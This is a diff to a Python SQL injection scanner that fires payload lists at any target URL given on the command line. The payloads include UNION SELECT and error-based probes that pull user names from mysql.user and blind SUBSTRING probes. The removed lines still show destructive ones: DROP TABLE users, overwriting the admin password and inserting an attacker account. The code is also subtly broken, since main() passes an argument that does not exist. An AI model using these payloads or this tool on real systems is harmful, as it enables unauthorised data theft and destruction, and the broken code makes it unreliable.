@@ -51,15 +51,27 @@ class SQLInjectionScanner:
         elif self.database_type == "PostGre":
             await self.perform_postgre_get_current_user()
         elif self.database_type == "Microsoft_SQL":
-            print("Microsoft SQL Server: Retrieving current user...")
+            await self.perform_microsoftsql_get_current_user()
         elif self.database_type == "Oracle":
-            print("Oracle: Retrieving current user...")
+            await self.perform_oracle_get_current_user()
         elif self.database_type == "Advantage_Database":
-            print("Advantage Database: Retrieving current user...")
+            await self.perform_advantage_get_current_user()
         elif self.database_type == "Firebird":
-            print("Firebird: Retrieving current user...")
+            await self.perform_firebird_get_current_user()
         else:
             print(f"Unsupported database type: {self.database_type}")
+
+    async def perform_microsoftsql_get_current_user(self):
+        print("Microsoft SQL Server: Retrieving current user...")
+
+    async def perform_firebird_get_current_user(self):
+        print("Firebird: Retrieving current user...")
+
+    async def perform_advantage_get_current_user(self):
+        print("Advantage Database: Retrieving current user...")
+
+    async def perform_oracle_get_current_user(self):
+        print("Oracle: Retrieving current user...")
 
     async def perform_postgre_get_current_user(self):
         print("PostgreSQL: Retrieving current user...")
@@ -95,19 +107,19 @@ class SQLInjectionScanner:
         async with aiohttp.ClientSession() as session:
             unique_responses = set()
 
-            for query in [
+            queries = [
                 f"1' OR 1=CONVERT(int, (SELECT {func}())); --" for func in ['user', 'current_user', 'system_user', 'host_name', '@@session.user', '@@user']
             ] + [
                 f"1' UNION SELECT null, {func}(), null; --" for func in ['user', 'system_user', 'current_user', 'session_user', '@@user', '@@session.user', 'host_name', 'system_user FROM mysql.user', 'user FROM mysql.user WHERE user NOT LIKE \'root\'', 'user FROM information_schema.tables WHERE table_schema != \'mysql\'']
             ] + [
-                f"1' OR IF(1=1, {func}(), 0) --" for func in ['SLEEP(5)', 'BENCHMARK(5000000, MD5(\'testing\'))', 'user', 'current_user', 'system_user', 'host_name', '@@session.user']
+                f"1' OR IF(1=1, {func}(), 0) --" for func in ['user', 'current_user', 'system_user', '@@session.user']
             ] + [
                 f"1' OR 1=CONVERT(int, (SELECT {func})); --" for func in ['@@version', 'user', 'current_user', 'system_user', 'host_name', '@@session.user']
             ] + [
-                f"1' OR SUBSTRING({func}(), 1, 1) = 'a'; --" for func in ['user', 'user() = \'root\'', 'current_user() LIKE \'a%\'', 'host_name() = \'localhost\'']
-            ] + [
-                f"'; {action}; --" for action in ['DROP TABLE users', 'UPDATE users SET password = \'malicious\' WHERE username = \'admin\'', 'INSERT INTO users (username, password) VALUES (\'attacker\', \'malicious\')', 'DELETE FROM users WHERE username = \'admin\'']
-            ]:
+                f"1' OR SUBSTRING({func}(), 1, 1) = 'a'; --" for func in ['user', 'current_user LIKE \'a%\'']
+            ]
+
+            for query in queries:
                 post_data = {}
                 full_url = f'{self.target_url}+{query}'
 
@@ -124,19 +136,19 @@ class SQLInjectionScanner:
                     print(f"MySQL: Error performing POST request for query '{query}': {e}")
 
     @classmethod
-    async def create(cls, target_url, database_type):
-        scanner = cls(target_url, database_type)
+    async def create(cls, target_url):
+        scanner = cls(target_url, "")
         db_type = await scanner.scan_database_type()
         if db_type:
+            await scanner.get_database_name()
             await scanner.get_current_user()
         else:
-            print(f"Unsupported or unknown database type: {database_type}")
-
+            print(f"Could not find a vulnerability...")
 async def main():
     parser = argparse.ArgumentParser(description="SQL Injection Scanner")
     parser.add_argument("target_url", help="Target URL")
     args = parser.parse_args()
     scanner = await SQLInjectionScanner.create(args.target_url, args.database_type)
-
+    
 if __name__ == "__main__":
     asyncio.run(main())
